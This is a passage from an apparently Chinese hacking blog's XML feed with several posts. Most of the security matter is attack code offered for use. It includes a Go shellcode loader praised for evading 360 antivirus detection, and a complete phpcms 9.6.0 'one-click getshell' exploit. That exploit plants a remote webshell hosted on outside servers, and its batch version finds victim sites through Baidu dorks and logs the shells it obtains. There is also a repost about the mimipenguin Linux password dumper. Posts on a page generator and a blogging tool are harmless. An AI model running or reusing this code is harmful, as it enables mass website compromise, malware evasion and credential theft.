<p>以上就是全部代码<br>其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"syscall"</span></div><div class="line">    <span class="string">"unsafe"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreadExecute</span><span class="params">(Shellcode []<span class="keyword">byte</span>)</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> K32 = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</div><div class="line">    <span class="keyword">var</span> CreateThread = K32.MustFindProc(<span class="string">"CreateThread"</span>)</div><div class="line">    <span class="keyword">var</span> VirtualAlloc = K32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</div><div class="line">    <span class="keyword">var</span> WaitForSingleObject = K32.MustFindProc(<span class="string">"WaitForSingleObject"</span>)</div><div class="line"></div><div class="line">    Addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)</div><div class="line">    AddrPtr := (*[<span class="number">990000</span>]<span class="keyword">byte</span>)(unsafe.Pointer(Addr))</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(Shellcode); i++ &#123;</div><div class="line">        AddrPtr[i] = Shellcode[i]</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ThreadAddr, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, Addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">    WaitForSingleObject.Call(ThreadAddr, <span class="number">0xFFFFFFFF</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的</p>
<h2 id="杀毒测试"><a href="#杀毒测试" class="headerlink" title="杀毒测试"></a>杀毒测试</h2><p>在代码所在目录cmd执行<code>go build</code>得到二进制文件（或者可以用<code>go build -ldflags=&quot;-s -w&quot;</code>减小体积，<code>go build -ldflags=&quot;-H windowsgui -s -w&quot;</code>去掉命令窗口）<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f0e9a00.png" alt=""><br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f8a704c.png" alt=""></p>
<p>可以看到360的静态查杀和动态查杀都没有发现<br>那么是否正常工作呢<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f6d4862.png" alt=""></p>
<p>可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840dbdc23f.png" alt=""></p>
<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><div class="bili_video"><embed height="452" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="http://share.acg.tv/flash.swf" flashvars="aid=9975200&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></div>]]></content>
      
        <categories>
            
            <category> Hacker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[自己网盘的页面生成器(私用公开-Golang)]]></title>
      <url>http://akkuman.coding.me/2017/04/13/my-yun-generateHTML-with-golang.html</url>
      <content type="html"><![CDATA[<p>虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的</p>
<h2 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h2><p>这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）<br><a id="more"></a></p>
<h2 id="关于页面的生成"><a href="#关于页面的生成" class="headerlink" title="关于页面的生成"></a>关于页面的生成</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>那时候只有两三个文件，html页面是我手写的手动增加的</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html</p>
<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化<br>然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历<br>但是自从<strong>T00ls灵车漂移事件以来，官方管理员给<em>GetWriter</em>老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了）</strong>，这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写</p>
<h4 id="暂时实现的功能"><a href="#暂时实现的功能" class="headerlink" title="暂时实现的功能"></a>暂时实现的功能</h4><ul>
<li>支持模板</li>
<li>加入了配置文件（其实也是模板）</li>
<li>加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）<br>可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了</li>
</ul>
<h2 id="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"><a href="#更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看" class="headerlink" title="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"></a>更新记录在下面，更新后的代码就不贴了，<strong>之前的代码我就在这个页面上删了</strong>，自己感兴趣可以上github查看</h2><h2 id="至于前端"><a href="#至于前端" class="headerlink" title="至于前端"></a>至于前端</h2><p><del>你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改</del></p>
<p><strong>为它搞了一套css与文件类型图标</strong>（关于style.css文件，是需要你放到远端在线调用的，你可以上传到七牛，或者你同步的时候放到网站根目录下，然后通过域名+/style.css的方式来调用）</p>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><ul>
<li>对一部分冗余的进行了优化，提升了一丁点效率</li>
<li>可以放到环境变量path了，不需要放到本目录里了，只需要在本目录调用就可以（当然），按照之前的方法也是可以的</li>
</ul>
<hr>
<ul>
<li>对文件li列表做了排序，优先级为后缀名-&gt;文件名</li>
<li>对li列表加了css类，可以自定义li的css了，具体见生成后的文件</li>
<li>为页面生成器搞了一套css，为类型加上了图标，具体效果见下图<br><img src="https://ooo.0o0.ooo/2017/04/14/58f0f09499fda.png" alt="snipaste_20170414_235335.png"></li>
</ul>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>这次不能给抓住机会了，放github吧</p>
<ul>
<li><a href="https://github.com/akkuman/generateIndexHTML" target="_blank" rel="external">代码下载地址</a></li>
<li><a href="https://github.com/akkuman/generateIndexHTML/bin" target="_blank" rel="external">二进制文件下载地址</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Golang </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[百度搜索引擎取真实地址-python代码]]></title>
      <url>http://akkuman.coding.me/2017/04/11/BaiduSearch-get-realUrl-with-python.html</url>
      <content type="html"><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法"></a>示例用法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</div><div class="line">&#125;</div><div class="line"></div><div class="line">def parseBaidu(keyword, pagenum)</div><div class="line"></div><div class="line">def main():</div><div class="line">    for url in parseBaidu("keyword",10):</div><div class="line">        if url:</div><div class="line">            print(url)</div><div class="line">        else:</div><div class="line">            continue</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[phpcms9-6-0 一键getshell工具]]></title>
      <url>http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html</url>
      <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
</ul>
<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
<li>[] 加入对有验证码phpcms网站的支持</li>
<li>[] 加入批量(<strong>已完成</strong>)</li>
</ul>
<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">        </div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line"></div><div class="line">        successUrl = <span class="string">""</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="comment"># from urlparse import unquote //Python2</span></div><div class="line"><span class="comment"># from urlparse import urlparse //Python2</span></div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">if</span> crawlUrl:</div><div class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</div><div class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</div><div class="line">                successUrl = <span class="string">""</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    saveShell(successUrl)</div><div class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="external">代码下载地址</a></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[抓取当前登录用户登录密码的工具：mimipenguin]]></title>
      <url>http://akkuman.coding.me/2017/04/02/mimipenguin.html</url>
      <content type="html"><![CDATA[<p><strong><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="external">Github项目地址</a></strong></p>
<p>前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。<br>编写思路来自流行的<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">windows密码抓取神器mimikatz</a><br><a id="more"></a><br><img src="https://ooo.0o0.ooo/2017/04/06/58e5a6e8ac47f.png" alt=""></p>
<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查/etc/shadow文件hash,内存中的hash和正则匹配去尝试计算出每个单词的概率</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul>
<li>root权限</li>
</ul>
<h2 id="已支持-以下环境已通过测试"><a href="#已支持-以下环境已通过测试" class="headerlink" title="已支持(以下环境已通过测试)"></a>已支持(以下环境已通过测试)</h2><ul>
<li>Kali 4.3.0 (rolling) x64 (gdm3)</li>
<li>Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>VSFTPd 3.0.3-8+b1 (Active FTP client connections)</li>
<li>Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency]</li>
<li>openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)</li>
</ul>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><ul>
<li>在内存中的密码 - 100%有效</li>
<li>计划扩大支持和其他凭证位置</li>
<li>努力扩展到非桌面环境</li>
<li>已知bug - 有时gcore会挂起脚本，不过这是gcore导致的问题</li>
<li>开放提出请求和社区研究</li>
<li>计划未来的LDAP研究（nscld winbind等）</li>
</ul>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
<li>Twitter: <a href="https://twitter.com/HunterGregal" target="_blank" rel="external">@huntergregal</a></li>
<li>个人站点: <a href="http://huntergregal.com/" target="_blank" rel="external">huntergregal.com</a></li>
<li>Github: <a href="https://github.com/huntergregal" target="_blank" rel="external">huntergregal</a></li>
</ul>
<h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><ul>
<li>the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option</li>
<li>gentilkiki for Mimikatz, the inspiration and the twitter shoutout</li>
<li>pugilist for cleaning up PID extraction and testing</li>
<li>ianmiell for cleaning up some of my messy code</li>
<li>w0rm for identifying printf error when special chars are involved</li>
<li>benichmt1 for identifying multiple authenticate users issue</li>
<li>ChaitanyaHaritash for identifying special char edge case issues</li>
</ul>
<p>转载自<a href="https://github.com/huntergregal/mimipenguin/blob/master/README.md" target="_blank" rel="external">mimipenguin</a></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[推荐一个静态博客兼笔记的工具：WDTP]]></title>
      <url>http://akkuman.coding.me/2017/04/01/Walden-Tips-Introdution.html</url>
      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：<strong>简洁高效、轻灵优雅、先进强悍、操作简单</strong>。</p>
<a id="more"></a>
<p><img src="http://underwaysoft.com/works/wdtp/media/wdtp-main.jpg" alt=""></p>
<p>WDTP（山湖录）可运行于macOS和Windows系统下，旨在提高这两大平台下所有写作/分享者的生产力及生产效率，节约耗时，减少无谓的智能、体力与资源消耗。它适合于以下群体：</p>
<ul>
<li>以<strong>文字、声音、图片、视频为主要内容</strong>的写作/记录/创作/分享者</li>
<li>职业或业余作家、小说家、编剧、技术类图书的作者及编撰者</li>
<li>经常记笔记或写点东西的人</li>
<li>写作极客</li>
<li>打算采用静态页面的个人博客</li>
<li>打算采用静态页面的中小企业<br>WDTP的全名是：<strong>Walden Tips</strong>，中文名称：<strong>山湖录</strong>，UnderwaySoft开发出品。设计、编程及维护：SwingCoder。立项日期：2016年8月2日，第一个内测版发布日期：2017年2月3日。</li>
</ul>
<h2 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h2><ul>
